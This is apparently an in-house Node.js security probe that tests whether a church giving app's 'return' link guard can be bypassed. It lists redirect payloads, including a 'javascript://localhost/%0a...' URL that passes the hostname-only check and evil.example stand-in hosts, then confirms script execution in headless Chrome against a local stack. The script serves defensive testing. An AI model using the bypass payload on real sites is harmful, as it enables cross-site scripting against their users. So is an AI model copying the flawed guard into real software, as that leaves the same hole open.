// Input probe 5: the giving app's card test page builds its "Back to ChurchOS" link from ?return=. The check is hostname-only, so a
// javascript: URL with an authority component passes it. This probe proves the link target and clicks it in headless Chrome.
// LOCAL STACK ONLY (giving app 3001, API 4000). Needs puppeteer-core + Chrome/Edge. Usage: node docs/security/probes/input-redirect-xss.mjs
import { existsSync } from 'node:fs';
import puppeteer from 'puppeteer-core';
const GIVING = 'http://localhost:3001', API = 'http://localhost:4000';
const guard = (u) => { try { const x = new URL(u, 'http://localhost:3001/'); return x.hostname === 'localhost' ? x.toString() : '/'; } catch { return '/'; } }; // copy of Checkout.tsx logic
const cases = ['javascript://localhost/%0awindow.__xss=1', 'javascript:window.__xss=1', 'https://evil.example/', '//evil.example/', 'http://localhost:9999/other-service', 'data:text/html,x', 'https://localhost.evil.example/', 'https://evil.example@localhost/'];
for (const c of cases) console.log(`${guard(c) === '/' ? 'blocked' : 'PASSES GUARD'} return=${c} -> ${guard(c)}`);
const chrome = ['C:/Program Files/Google/Chrome/Application/chrome.exe', 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe'].find(existsSync);
if (!chrome) { console.log('no Chrome/Edge: skipped the browser step'); process.exit(0); }
const give = await (await fetch(`${API}/public/give`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ code: 'GRC001', purpose: 'OFFERING', phone: '0712000111', amount: 20, method: 'card' }) })).json();
const link = give.checkoutUrl; if (!link) { console.log('no card checkout url', JSON.stringify(give)); process.exit(1); }
const url = `${link}${link.includes('?') ? '&' : '?'}return=${encodeURIComponent('javascript://localhost/%0awindow.__xss=1')}`;
const b = await puppeteer.launch({ executablePath: chrome, headless: true, args: ['--no-sandbox'] }); const p = await b.newPage();
await p.goto(url, { waitUntil: 'networkidle2' });
const inputs = await p.$$('input'); const vals = ['4242 4242 4242 4242', '12/30', '123', 'Test Person'];
for (let i = 0; i < 4; i++) await inputs[i].type(vals[i]);
await p.click('button[type=submit]'); await p.waitForSelector('a.btn.primary', { timeout: 20000 });
const href = await p.$eval('a.btn.primary', (a) => a.getAttribute('href'));
await p.click('a.btn.primary').catch(() => {}); await new Promise((r) => setTimeout(r, 800));
const ran = await p.evaluate(() => window.__xss === 1).catch(() => 'page navigated');
console.log(`href on the Back button: ${href}\nscript executed after click on the giving origin: ${ran}`);
await b.close();
